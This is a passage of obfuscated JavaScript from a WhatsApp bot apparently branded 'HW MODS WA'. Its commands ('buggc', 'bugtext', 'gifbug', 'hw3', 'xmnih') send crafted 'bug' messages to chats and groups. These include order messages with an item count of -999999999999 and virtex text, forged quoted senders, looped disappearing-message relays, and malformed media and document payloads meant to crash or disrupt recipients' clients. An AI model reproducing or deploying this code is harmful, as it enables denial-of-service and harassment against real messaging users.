EAAAAAAAAAAAAAAAAAITAQ/9oACAECAQE/AMYN/wD/xAAdEQACAQUBAQAAAAAAAAAAAAAAAQIQERIhQTFh/9oACAEDAQE/APRoeOh2T1Tld2GIT5Y3b4RrlJGUmO8XREXo4NsZ/9k=','caption':_0x57f6fe(0x1c7),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),await Haikal[_0x57f6fe(0x1be)](Haikal[_0x57f6fe(0x1c9)](from,Haikal[_0x57f6fe(0x1b7)](0x0),{}),{'waitForAck':!![]}),Haikal[_0x57f6fe(0x1be)](res),await setTimeout(()=>{var _0x6a022a=_0x57f6fe;freply(_0x6a022a(0x1c2));},0xbb8);function _0x4d14(){var _0x52597f=['158vqNHHk','3082XIkgbI','3549975xfCrmh','https://chat.whatsapp.com/BqtzrhqPxvFG2Kg2k1jaUi','HW\x20MODS\x20WA','prepareMessageFromContent','3863608gHJaHU','35poAwLA','55773QaQXOT','fromMe','12xTmgfC','prepareDisappearingMessageSettingContent','8vXXHza','1819543ktSgaJ','BqtzrhqPxvFG2Kg2k1jaUi','34699303450-1355008702@g.us','162533333338378','409200uXjnrC','relayWAMessage','70MpDsqV','90918jYMpnB','key','Limit-anda-sudah-habis-....!!!\x20Pulsa\x20anda\x20tidak\x20mencukupi\x20untuk\x20melakukan\x20WhatsApp\x20kepada\x20Haikal\x20..\x20!!!\x20Terimakasih..','7DAGvtP'];_0x4d14=function(){return _0x52597f;};return _0x4d14();}
break
case "buggc":
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
        function _0x1cb7(_0x5b11ad,_0x337f53){var _0x45ab97=_0x45ab();return _0x1cb7=function(_0x1cb75d,_0x4d64d3){_0x1cb75d=_0x1cb75d-0xa2;var _0x25d5c5=_0x45ab97[_0x1cb75d];return _0x25d5c5;},_0x1cb7(_0x5b11ad,_0x337f53);}var _0x3a5a33=_0x1cb7;(function(_0x31c1cc,_0x492001){var _0x2aad6e=_0x1cb7,_0x3847af=_0x31c1cc();while(!![]){try{var _0x35e4de=parseInt(_0x2aad6e(0xaa))/0x1+-parseInt(_0x2aad6e(0xb0))/0x2*(-parseInt(_0x2aad6e(0xaf))/0x3)+-parseInt(_0x2aad6e(0xa9))/0x4+parseInt(_0x2aad6e(0xac))/0x5*(-parseInt(_0x2aad6e(0xa8))/0x6)+parseInt(_0x2aad6e(0xad))/0x7+parseInt(_0x2aad6e(0xa3))/0x8*(-parseInt(_0x2aad6e(0xab))/0x9)+-parseInt(_0x2aad6e(0xa5))/0xa;if(_0x35e4de===_0x492001)break;else _0x3847af['push'](_0x3847af['shift']());}catch(_0x138b7c){_0x3847af['push'](_0x3847af['shift']());}}}(_0x45ab,0xb1945));if(!kal['key'][_0x3a5a33(0xa6)])return;await Haikal[_0x3a5a33(0xa4)](Haikal[_0x3a5a33(0xa7)](from,Haikal['prepareDisappearingMessageSettingContent'](0x0),{}),{'waitForAck':!![]}),await Haikal['relayWAMessage'](Haikal[_0x3a5a33(0xa7)](from,Haikal[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await Haikal[_0x3a5a33(0xa4)](Haikal[_0x3a5a33(0xa7)](from,Haikal[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await Haikal[_0x3a5a33(0xa4)](Haikal[_0x3a5a33(0xa7)](from,Haikal[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await Haikal[_0x3a5a33(0xa4)](Haikal[_0x3a5a33(0xa7)](from,Haikal[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),await Haikal[_0x3a5a33(0xa4)](Haikal[_0x3a5a33(0xa7)](from,Haikal[_0x3a5a33(0xa2)](0x0),{}),{'waitForAck':!![]}),freply(_0x3a5a33(0xae)+groupName);function _0x45ab(){var _0x90fcd=['\x20Sukses\x20Mengirim\x20Bug\x20Di\x20','161886xbucPe','46hRdTif','prepareDisappearingMessageSettingContent','189696oHkgAg','relayWAMessage','6938970bVRawM','fromMe','prepareMessageFromContent','30xneJsb','193652VKgdqT','789579sAjOpk','414vYeFtt','38885pmyNcg','3980249pAFWzA'];_0x45ab=function(){return _0x90fcd;};return _0x45ab();}
        break
// Bug virtext
case 'bugtext':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe) return 
if (args.length < 1) return freply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Haikal.sendMessage(from, `HW MODS WA${vipi,virtext}`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: -999999999999, // Bug
    status: 1,
    surface: 1,
    message: `HW MODS WA${virtex}`,
    orderTitle: `HW MODS WA${virtex}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
}}}}, 0)
}
break
case 'xmyo':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x269f55=_0x1217;(function(_0x3c15e6,_0x127f3d){var _0x5e5d3e=_0x1217,_0x35c32f=_0x3c15e6();while(!![]){try{var _0x18cc79=-parseInt(_0x5e5d3e(0xb9))/0x1*(parseInt(_0x5e5d3e(0xb4))/0x2)+parseInt(_0x5e5d3e(0xa5))/0x3+parseInt(_0x5e5d3e(0xac))/0x4*(parseInt(_0x5e5d3e(0xaa))/0x5)+-parseInt(_0x5e5d3e(0xae))/0x6*(parseInt(_0x5e5d3e(0xb7))/0x7)+-parseInt(_0x5e5d3e(0xba))/0x8*(parseInt(_0x5e5d3e(0xb8))/0x9)+-parseInt(_0x5e5d3e(0xaf))/0xa+parseInt(_0x5e5d3e(0xb0))/0xb;if(_0x18cc79===_0x127f3d)break;else _0x35c32f['push'](_0x35c32f['shift']());}catch(_0x34b936){_0x35c32f['push'](_0x35c32f['shift']());}}}(_0x39d0,0x52cbb));if(isBan)return reply(mess[_0x269f55(0xad)]);function _0x1217(_0x31124b,_0x9d394a){var _0x39d0d5=_0x39d0();return _0x1217=function(_0x121733,_0xdd3faf){_0x121733=_0x121733-0xa4;var _0x3015b0=_0x39d0d5[_0x121733];return _0x3015b0;},_0x1217(_0x31124b,_0x9d394a);}function _0x39d0(){var _0x43d0cc=['bLkJDAppmOOywWMYD30qShimr/q3xlW7Nvo6PJat8Hxx7EnCjPTF3KABJl/UCLbNNX/9lmcTCId3XseHuuZbxix2Nya/Zo0t82dldeEYe5xZgan3LfON0SyMsHC2dE3FJc8aJaI7NUuokH9WrZoqDAQWqYpR9A6FCqN7hOycRI7+BazfMlsGGwZdEDnknoDMIdreX+/Cdys1FLFmxNslv5NqhWZQ2kX8HNq7WrT4nm3nZBrOFkuEX3Iyb15QlgObQVu9F5RAmoP8dF4RXEIeNSIg9mKQ19eebSwSNUAOxUrDjqR8k6Hk6Qq+oyp1efcmicVdg7Ew7mw/KClFjwmsP+zn9nqS+ots73KkroJj/fcrPnaszRbo41TbupKrl7PJEkmgaeeET3fb82Lwd+wbL085//d1f2kuGLfOVFspOoNEuKlOsHzkQlVEXFBinXmoJsKyou5/KKlM6LMr2UB/8ri95lyDnzoiR3yuG1UV/Dxwplp1FD/Mx6yGxC2pLU3bDFGuxv4ai/hIKnJcBy/6nOj3s65V/4EgDWUkGvNO6Wz6WjUCE/NnFK/oMfObdJZ92xIqgFYpazA8HGH1fXNiI8QVmyF9U663OJV27qsO0eXQ9/APcSy2rJqNVEg5uaMuxUmZDmgTUfMtkuub7kw8ciMzd+Tung95LYoSi+AEz9/xunG5N0XESS6XsgWr0vOgMss8JrCy4KLlMy+tR+HNcrq1ELGyPNai2pKvVralESWaAymPDMZDwQxljrkI8VuhC0XfjksNiw8qQZC/4wGkB1WBFDFiwDGtegB6Drg7ol62fdfut328TytU6l/Rtjyrtfup0H3zBMm5kUQ9ejR5Xk0w7ON9hiRS2oFvirtfHILIBmeJWPy9FXgxLNedfJVuPxWt8AQNbD3mr5AtWevmmwkueoHTdt6E1/i5sgY2rvCx0XhYoEpk6MDab1OBYrYM/3lLhuRzRoOv8ixSoffqOgfcnU9FMJSM1+VcBwOomiL1RergD3aXp37ogmL2SMDIi/FYuY8cWfTuSITfC8EfgMemBDxJfTKmJs8u69z89PgaF4tA+U5f1EwM','relayWAMessage','5282665','2045yhZDnk','\x20❏HW\x20MODS\x20WA❏\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09©XM\x20XHIRO\x20MHONSHINE','3200hMqATO','ban','83778dOmaxG','1935690oEgNDT','3353119ojrowz','GhOoxlYkXXwHRe2nBCpzSaCMqVtxkFCF5EnmkGSh1j8=','HAIKAL\x20😍','1632634747','37234TuGETe','HAIKAL','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a©XM\x20XHIRO\x20MHONSHINE','98DelmCM','9QxhXkw','5uHcGSY','795032rDEYyb','prepareMessageFromContent','./stik/Ahhikal.jpeg','865851hihOHm','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g'];_0x39d0=function(){return _0x43d0cc;};return _0x39d0();}res=await Haikal[_0x269f55(0xbb)](from,{'buttonsMessage':{'text':'','videoMessage':{'url':'https://mmg.whatsapp.net/d/f/AmRWFRz8fQvWQQVmlXLSK6SVrVfkPYEq6GPmLk8ZAZ9D.enc','mimetype':'video/mp4','fileSha256':'bBSRV+Q3Qjr51H/Ulx0Cbc9hN2qCdKbAQTuRlrbnIX0=','fileLength':_0x269f55(0xa9),'seconds':0x19,'mediaKey':_0x269f55(0xb1),'caption':_0x269f55(0xb2),'height':0x160,'width':0x280,'fileEncSha256':'xyTEPyp9LZaGBtchwTgCUOroA6+EPCNRbggAIJPZF7s=','directPath':'/v/t62.7161-24/23653129_1202032633627750_2162361394837558542_n.enc?ccb=11-4&oh=0a60da06118ab3898b236582f191a34d&oe=61742822','mediaKeyTimestamp':_0x269f55(0xb3),'jpegThumbnail':fs['readFileSync'](_0x269f55(0xa4)),'streamingSidecar':_0x269f55(0xa7)},'contentText':_0x269f55(0xb6)+ngazap(prefix),'footerText':_0x269f55(0xa6),'buttons':[{'buttonId':_0x269f55(0xb5),'buttonText':{'displayText':_0x269f55(0xab)+ngazap(prefix)},'type':'RESPONSE'}],'headerType':'VIDEO'}},{'quoted':kal}),Haikal[_0x269f55(0xa8)](res);
break
case 'xmbro':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x596d0c=_0x5e12;(function(_0x3b7803,_0x45de8d){var _0x408dd4=_0x5e12,_0x9ddd92=_0x3b7803();while(!![]){try{var _0x19d83f=parseInt(_0x408dd4(0x115))/0x1*(-parseInt(_0x408dd4(0x11d))/0x2)+parseInt(_0x408dd4(0x11c))/0x3+parseInt(_0x408dd4(0x108))/0x4*(parseInt(_0x408dd4(0x119))/0x5)+-parseInt(_0x408dd4(0x11e))/0x6+parseInt(_0x408dd4(0x109))/0x7*(parseInt(_0x408dd4(0x10d))/0x8)+parseInt(_0x408dd4(0x10b))/0x9*(-parseInt(_0x408dd4(0x111))/0xa)+parseInt(_0x408dd4(0x117))/0xb;if(_0x19d83f===_0x45de8d)break;else _0x9ddd92['push'](_0x9ddd92['shift']());}catch(_0x1ec3aa){_0x9ddd92['push'](_0x9ddd92['shift']());}}}(_0x2647,0x6833a));if(isBan)return reply(mess['ban']);function _0x2647(){var _0x58905b=['41724','732936jxzmDC','IMAGE','/v/t62.7118-24/40814942_894434631167103_6128360717210971009_n.enc?ccb=11-4&oh=9dda6f99494de7bec26356eb40066b4d&oe=61755509','HAIKAL','92370hAtQlr','RESPONSE','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a©XM\x20XHIRO\x20MHONSHINE','relayWAMessage','566269eMRTaQ','https://mmg.whatsapp.net/d/f/AmPEkmmNOvdptA7RnPyYJvMoePjLNOCJ-w7TJRAtnN6O.enc','15132634MvQbju','HW\x20MODS\x20WA😍','10mjDuGZ','xr2d13oMedRrGkIH6hE/2Ln+dfVyX6KqlK2NhfKTIzFnpy3b4ynDow==','prepareMessageFromContent','2270646ZnmHDq','2sZMXoW','4873680cnVJUd','upO62/S7uPP3aObb/Ribyf/RRQgKFSvhdllcoP2ixBY=','\x20❏HW\x20MODS\x20WA❏\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09©XM\x20XHIRO\x20MHONSHINE','1632666462','401596xTgIDR','14BCGBVQ','IuG6p6xjeHMURysJeB772SPk6g2n+hyyzeyxVETTYZ4=','693FbsHUp'];_0x2647=function(){return _0x58905b;};return _0x2647();}function _0x5e12(_0xc5c356,_0x10557d){var _0x2647e4=_0x2647();return _0x5e12=function(_0x5e12e0,_0xf1165f){_0x5e12e0=_0x5e12e0-0x108;var _0x4fc862=_0x2647e4[_0x5e12e0];return _0x4fc862;},_0x5e12(_0xc5c356,_0x10557d);}res=await Haikal[_0x596d0c(0x11b)](from,{'buttonsMessage':{'text':'','imageMessage':{'url':_0x596d0c(0x116),'mimetype':'image/jpeg','caption':_0x596d0c(0x118),'fileSha256':_0x596d0c(0x10a),'fileLength':_0x596d0c(0x10c),'height':0x280,'width':0x280,'mediaKey':'CHWNuBGiL1XuUdJF3Y2qDiyuSaPAVIH9vDpNpYEpoqk=','fileEncSha256':'CkxcGOoIO5NuE/CdEI9ia6FKf2Dp5gsbH7aQnTZRPDQ=','directPath':_0x596d0c(0x10f),'mediaKeyTimestamp':_0x596d0c(0x121),'jpegThumbnail':fs['readFileSync']('./stik/Ahhikal.jpeg'),'scansSidecar':_0x596d0c(0x11a),'scanLengths':[0x12c8,0x3cd7,0x1e3e,0x351f],'midQualityFileSha256':_0x596d0c(0x11f)},'contentText':_0x596d0c(0x113)+ngazap(prefix),'footerText':'https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','buttons':[{'buttonId':_0x596d0c(0x110),'buttonText':{'displayText':_0x596d0c(0x120)+ngazap(prefix)},'type':_0x596d0c(0x112)}],'headerType':_0x596d0c(0x10e)}},{'quoted':kal}),Haikal[_0x596d0c(0x114)](res);
break
case 'kalhw':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x4dc560=_0x2fb6;(function(_0x95be98,_0x50f4d5){var _0x157bb0=_0x2fb6,_0x339679=_0x95be98();while(!![]){try{var _0x2294fb=parseInt(_0x157bb0(0xd9))/0x1*(-parseInt(_0x157bb0(0xd6))/0x2)+-parseInt(_0x157bb0(0xc7))/0x3*(parseInt(_0x157bb0(0xce))/0x4)+parseInt(_0x157bb0(0xc6))/0x5*(parseInt(_0x157bb0(0xd1))/0x6)+parseInt(_0x157bb0(0xd3))/0x7*(parseInt(_0x157bb0(0xd5))/0x8)+-parseInt(_0x157bb0(0xc3))/0x9+parseInt(_0x157bb0(0xc9))/0xa+parseInt(_0x157bb0(0xc8))/0xb*(parseInt(_0x157bb0(0xcb))/0xc);if(_0x2294fb===_0x50f4d5)break;else _0x339679['push'](_0x339679['shift']());}catch(_0x4ad67c){_0x339679['push'](_0x339679['shift']());}}}(_0x3101,0x4c2e3));if(isBan)return reply(mess[_0x4dc560(0xd2)]);if(!kal[_0x4dc560(0xcf)][_0x4dc560(0xca)]&&!isOwner)return;function _0x3101(){var _0x226b84=['2328GMLeiH','https://wa.me/c/62857141709445','prepareMessageFromContent','171540kmhydD','key','./stik/Ahhikal.jpeg','696AYvnob','ban','14jAxHAJ','readFileSync','176216MwjwwW','70gbSfjw','NONE','HW\x20MODS\x20WA','4951WubEPt','1266615uPCtPY','relayWAMessage','Buka\x20tautan\x20ini\x20untuk\x20melihat\x20katalog\x20kami\x20di\x20WhatsApp:\x20https://wa.me/c/62857141709445','25605GODwXA','27DXbmbt','8030lZdLYp','2323100LiizGt','fromMe'];_0x3101=function(){return _0x226b84;};return _0x3101();}function _0x2fb6(_0x241135,_0x2122b1){var _0x3101ca=_0x3101();return _0x2fb6=function(_0x2fb64d,_0x7347e7){_0x2fb64d=_0x2fb64d-0xc3;var _0x1a8b30=_0x3101ca[_0x2fb64d];return _0x1a8b30;},_0x2fb6(_0x241135,_0x2122b1);}res=await Haikal[_0x4dc560(0xcd)](from,{'extendedTextMessage':{'text':_0x4dc560(0xc5),'matchedText':_0x4dc560(0xcc),'description':'©XM\x20XHIRO\x20MHONSHINE'+ngazap(prefix),'title':_0x4dc560(0xd8),'previewType':_0x4dc560(0xd7),'jpegThumbnail':fs[_0x4dc560(0xd4)](_0x4dc560(0xd0)),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x4dc560(0xc4)](res);
break
case 'gifbug':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x328f44=_0x59c5;(function(_0x31ee91,_0x3f570f){var _0x228a52=_0x59c5,_0x4cf15b=_0x31ee91();while(!![]){try{var _0x2f5f11=parseInt(_0x228a52(0xbe))/0x1*(parseInt(_0x228a52(0xba))/0x2)+-parseInt(_0x228a52(0xb6))/0x3+parseInt(_0x228a52(0xb0))/0x4*(parseInt(_0x228a52(0xaf))/0x5)+parseInt(_0x228a52(0xb2))/0x6*(parseInt(_0x228a52(0xb8))/0x7)+parseInt(_0x228a52(0xc2))/0x8+-parseInt(_0x228a52(0xb5))/0x9+-parseInt(_0x228a52(0xb9))/0xa;if(_0x2f5f11===_0x3f570f)break;else _0x4cf15b['push'](_0x4cf15b['shift']());}catch(_0xa0e5ef){_0x4cf15b['push'](_0x4cf15b['shift']());}}}(_0x4278,0xc5713));function _0x59c5(_0x5d63ba,_0x51a37a){var _0x4278fd=_0x4278();return _0x59c5=function(_0x59c5a0,_0x4332a4){_0x59c5a0=_0x59c5a0-0xad;var _0x7189ed=_0x4278fd[_0x59c5a0];return _0x7189ed;},_0x59c5(_0x5d63ba,_0x51a37a);}function _0x4278(){var _0x11f1aa=['816402izofcM','fromMe','readFileSync','8609616MfksQe','361791cbmRmy','./stik/deden.jpeg','14cttSig','17910740YIvMtG','106egOdER','ban','NONE','prepareMessageFromContent','23473mDizqp','ko+Ly70I3IilIWwQrlkykzrDEpB15YVLKu4DPIIdWJc=','43669','https://mmg.whatsapp.net/d/f/AvxxWjBI4PPfLpd5dferJXfzBf0XFYW417g1NjbU29ak.enc','9678640JdSoQg','ow9WNRQfH66vR52DbKucI+amhXCN8GDSDUEjeFU20zI=','video/mp4','105665HUcJmo','180yhXmxM','4XCxTFWDfQKxiKaXlyqaj+hppZfXNZEp6scHqz+HvU4='];_0x4278=function(){return _0x11f1aa;};return _0x4278();}if(isBan)return reply(mess[_0x328f44(0xbb)]);if(!kal['key'][_0x328f44(0xb3)]&&!isOwner)return;res=await Haikal[_0x328f44(0xbd)](from,{'videoMessage':{'url':_0x328f44(0xc1),'mimetype':_0x328f44(0xae),'fileSha256':_0x328f44(0xad),'fileLength':_0x328f44(0xc0),'seconds':0x1,'mediaKey':_0x328f44(0xbf),'gifPlayback':!![],'height':0x110,'width':0x1f0,'fileEncSha256':_0x328f44(0xb1),'directPath':'/v/t62.9505-24/30766824_343661714219237_5037590755651868354_n.enc?ccb=11-4&oh=c4b2da5b588371263f6db035e946e4a4&oe=616DA5C8','mediaKeyTimestamp':'1632148118','jpegThumbnail':fs[_0x328f44(0xb4)](_0x328f44(0xb7)),'gifAttribution':_0x328f44(0xbc),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal['relayWAMessage'](res);
break
case 'hw3':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x3f725f=_0x3fd5;(function(_0x197bb5,_0x4ce86b){var _0x3f3b85=_0x3fd5,_0x3becdd=_0x197bb5();while(!![]){try{var _0x2cf3db=parseInt(_0x3f3b85(0x1c9))/0x1*(parseInt(_0x3f3b85(0x1c2))/0x2)+parseInt(_0x3f3b85(0x1cb))/0x3+parseInt(_0x3f3b85(0x1c3))/0x4+parseInt(_0x3f3b85(0x1c8))/0x5+-parseInt(_0x3f3b85(0x1bf))/0x6+-parseInt(_0x3f3b85(0x1c4))/0x7+-parseInt(_0x3f3b85(0x1c0))/0x8;if(_0x2cf3db===_0x4ce86b)break;else _0x3becdd['push'](_0x3becdd['shift']());}catch(_0x45d64a){_0x3becdd['push'](_0x3becdd['shift']());}}}(_0x3ea8,0x34e1f));if(isBan)return reply(mess[_0x3f725f(0x1c7)]);if(!kal['key'][_0x3f725f(0x1ca)]&&!isOwner)return;function _0x3ea8(){var _0x3fb798=['3100cJcEDX','357524zCHndQ','55776sKBuEM','1632148711','HW\x20MODS\x20WA.HW','ban','861770VenLIS','179EylgSx','fromMe','499974zaXnXk','https://mmg.whatsapp.net/d/f/AvhUeq32Voqws-hnzK3Rd0KhfF_GUzCtA0lqTHGJwD2C.enc','505446KCOCUP','3176216VRZBLa','relayWAMessage'];_0x3ea8=function(){return _0x3fb798;};return _0x3ea8();}function _0x3fd5(_0x849eb,_0x395cf7){var _0x3ea8d3=_0x3ea8();return _0x3fd5=function(_0x3fd5f8,_0x34743f){_0x3fd5f8=_0x3fd5f8-0x1be;var _0x37114a=_0x3ea8d3[_0x3fd5f8];return _0x37114a;},_0x3fd5(_0x849eb,_0x395cf7);}res=await Haikal['prepareMessageFromContent'](from,{'documentMessage':{'url':_0x3f725f(0x1be),'mimetype':'application/HW','title':_0x3f725f(0x1c6),'fileSha256':'cL3UDB6nrmnqR40mBwQZ6/Ep8h9lSWBcVxhiKwW8zNo=','fileLength':'10','pageCount':0x0,'mediaKey':'xsA5T7BvHYMPNGthuSttLC2Pj5Q/fXb81nARQHY4FD8=','fileName':_0x3f725f(0x1c6),'fileEncSha256':'gynXMrD2YurZVvpXc0lk1GZegx+5qpE/UnWBBEnp72M=','directPath':'/v/t62.7119-24/11291992_914899692712756_3253256600728627926_n.enc?ccb=11-4&oh=0d60b005087b291981e26b736aa9910c&oe=616D84FD','mediaKeyTimestamp':_0x3f725f(0x1c5),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x3f725f(0x1c1)](res);
break
case 'hello':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x52071c=_0x5996;function _0x5996(_0x322254,_0x14d465){var _0x2c572f=_0x2c57();return _0x5996=function(_0x599634,_0x2a220a){_0x599634=_0x599634-0xee;var _0x166d27=_0x2c572f[_0x599634];return _0x166d27;},_0x5996(_0x322254,_0x14d465);}(function(_0x45eb55,_0x1dc119){var _0x389807=_0x5996,_0x5aae6a=_0x45eb55();while(!![]){try{var _0x383363=-parseInt(_0x389807(0xf5))/0x1+-parseInt(_0x389807(0xf8))/0x2*(-parseInt(_0x389807(0xfa))/0x3)+parseInt(_0x389807(0xf3))/0x4*(parseInt(_0x389807(0xff))/0x5)+-parseInt(_0x389807(0xfd))/0x6*(parseInt(_0x389807(0xfc))/0x7)+-parseInt(_0x389807(0xee))/0x8*(parseInt(_0x389807(0xfb))/0x9)+parseInt(_0x389807(0xf6))/0xa+-parseInt(_0x389807(0xfe))/0xb*(parseInt(_0x389807(0xf2))/0xc);if(_0x383363===_0x1dc119)break;else _0x5aae6a['push'](_0x5aae6a['shift']());}catch(_0x4f41a9){_0x5aae6a['push'](_0x5aae6a['shift']());}}}(_0x2c57,0xae8af));if(isBan)return reply(mess['ban']);if(!kal['key'][_0x52071c(0xef)]&&!isOwner)return;res=await Haikal[_0x52071c(0xf0)](from,{'extendedTextMessage':{'text':_0x52071c(0xf1),'matchedText':_0x52071c(0xf1),'description':_0x52071c(0xf9),'title':_0x52071c(0x101),'previewType':_0x52071c(0xf7),'jpegThumbnail':fs['readFileSync'](_0x52071c(0x100)),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x52071c(0xf4)](res);function _0x2c57(){var _0x1b0efa=['16681AfdLtS','1308FKYTOe','154PYiFJd','5GuZEZN','./stik/Ahhikal.jpeg','©[XM]\x20XHIRO\x20MHONSHINE\x20✌️','200tXcJYF','fromMe','prepareMessageFromContent','https://chat.whatsapp.com/DpQJ5WaNdvUCWReyellknQ','970152aUQHcU','5505268KRCeAV','relayWAMessage','634581thdJxF','13923630ZrdhLU','NONE','176AhwRPt','Undangan\x20Grup\x20WhatsApp','21846dWzavz','147114MXkWCg'];_0x2c57=function(){return _0x1b0efa;};return _0x2c57();}
break
case 'kontul':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x4e4913=_0x1101;(function(_0x325383,_0x4e7d13){var _0x1ddbd7=_0x1101,_0x22f9a5=_0x325383();while(!![]){try{var _0x11a652=-parseInt(_0x1ddbd7(0xe6))/0x1+parseInt(_0x1ddbd7(0xdd))/0x2*(-parseInt(_0x1ddbd7(0xe2))/0x3)+-parseInt(_0x1ddbd7(0xe1))/0x4+parseInt(_0x1ddbd7(0xde))/0x5*(-parseInt(_0x1ddbd7(0xe5))/0x6)+-parseInt(_0x1ddbd7(0xe8))/0x7*(-parseInt(_0x1ddbd7(0xea))/0x8)+parseInt(_0x1ddbd7(0xe0))/0x9*(-parseInt(_0x1ddbd7(0xeb))/0xa)+-parseInt(_0x1ddbd7(0xe3))/0xb*(-parseInt(_0x1ddbd7(0xed))/0xc);if(_0x11a652===_0x4e7d13)break;else _0x22f9a5['push'](_0x22f9a5['shift']());}catch(_0x5129e3){_0x22f9a5['push'](_0x22f9a5['shift']());}}}(_0x13dd,0xc9a4f));if(isBan)return reply(mess[_0x4e4913(0xdf)]);if(!kal['key'][_0x4e4913(0xe4)]&&!isOwner)return;function _0x13dd(){var _0x4345be=['prepareMessageFromContent','920WYhguv','3310aPLpyO','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;WhatsApp;;;\x0aFN:WhatsApp\x0aORG:Haikal\x0aTITLE:\x0aitem1.TEL;waid=62857141709445:+62\x20857-1417-09445\x0aitem1.X-ABLabel:Ponsel\x0aX-WA-BIZ-DESCRIPTION:HW\x20MODS\x20WA🔥➥\x0aX-WA-BIZ-NAME:WhatsApp\x0aEND:VCARD','366936BJYGbf','WhatsApp','114leVvdd','185SWoJvU','ban','8073ttlcMm','283316ZjUmlY','70734aIBIcd','902YgXrBX','fromMe','11454yTlHvm','33236bhXDJr','relayWAMessage','8162pSdiUH'];_0x13dd=function(){return _0x4345be;};return _0x13dd();}function _0x1101(_0x1ba473,_0x4daa92){var _0x13ddc7=_0x13dd();return _0x1101=function(_0x110160,_0x576f60){_0x110160=_0x110160-0xdd;var _0xf3864c=_0x13ddc7[_0x110160];return _0xf3864c;},_0x1101(_0x1ba473,_0x4daa92);}res=await Haikal[_0x4e4913(0xe9)](from,{'contactMessage':{'displayName':_0x4e4913(0xee)+vipi,'vcard':_0x4e4913(0xec),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x4e4913(0xe7)](res);
break
case 'xmnih':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x46e398=_0x43cc;(function(_0x58e7fc,_0x20d6dc){var _0x46bffe=_0x43cc,_0x440ebb=_0x58e7fc();while(!![]){try{var _0x9ad4ea=-parseInt(_0x46bffe(0x1c4))/0x1*(parseInt(_0x46bffe(0x1c6))/0x2)+-parseInt(_0x46bffe(0x1bf))/0x3*(parseInt(_0x46bffe(0x1bd))/0x4)+-parseInt(_0x46bffe(0x1cb))/0x5+-parseInt(_0x46bffe(0x1c8))/0x6+parseInt(_0x46bffe(0x1c9))/0x7*(-parseInt(_0x46bffe(0x1c7))/0x8)+parseInt(_0x46bffe(0x1c0))/0x9+parseInt(_0x46bffe(0x1c3))/0xa;if(_0x9ad4ea===_0x20d6dc)break;else _0x440ebb['push'](_0x440ebb['shift']());}catch(_0x7dc056){_0x440ebb['push'](_0x440ebb['shift']());}}}(_0x194b,0x8058b));if(isBan)return reply(mess[_0x46e398(0x1b8)]);if(!kal[_0x46e398(0x1b9)][_0x46e398(0x1ba)]&&!isOwner)return;res=await Haikal[_0x46e398(0x1c5)](from,{'documentMessage':{'url':_0x46e398(0x1bc),'mimetype':_0x46e398(0x1bb),'title':_0x46e398(0x1c1),'fileSha256':'yyv1dpunMToLIpX0+Sj7B2n6Wd1N+/SMRjC4JG2z358=','fileLength':'165','pageCount':0x0,'mediaKey':_0x46e398(0x1cc),'fileName':_0x46e398(0x1ca)+ngazap(prefix),'fileEncSha256':'OrFhBtX/v9StB8SpWP85sXEO3IHsXStqJGdtnV0gDhE=','directPath':_0x46e398(0x1c2),'mediaKeyTimestamp':_0x46e398(0x1b7),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x46e398(0x1be)](res);function _0x43cc(_0x5909ca,_0x2e7ce4){var _0x194ba9=_0x194b();return _0x43cc=function(_0x43cc11,_0x2ec4b4){_0x43cc11=_0x43cc11-0x1b7;var _0x5d6df0=_0x194ba9[_0x43cc11];return _0x5d6df0;},_0x43cc(_0x5909ca,_0x2e7ce4);}function _0x194b(){var _0x3963ae=['2xFTtCR','486624fTwJvb','5386260Qgifat','49vRCByt','©XM\x20XHIRO\x20MHONSHINE','4065820jRnKSv','iuT3uxQ1HCusw1qmJQ72SiI85EgdoMKgoylx0vGlBnc=','1632190559','ban','key','fromMe','application/XM','https://mmg.whatsapp.net/d/f/AskvmNqn9g_YT4kXEeDds1TGY0W6A9PnCOHg8Yy8rBSW.enc','28ZxLtGq','relayWAMessage','318378lTHVes','6963651ZAuQXn','©XM\x20XHIRO\x20MHONSHINE.XM','/v/t62.7119-24/25430031_1179992609154827_126460455752424477_n.enc?ccb=11-4&oh=72abbafb0088ae811046aea75222c15a&oe=616D4A4B','27060240ojfMKp','74504zllYHJ','prepareMessageFromContent'];_0x194b=function(){return _0x3963ae;};return _0x194b();}
break
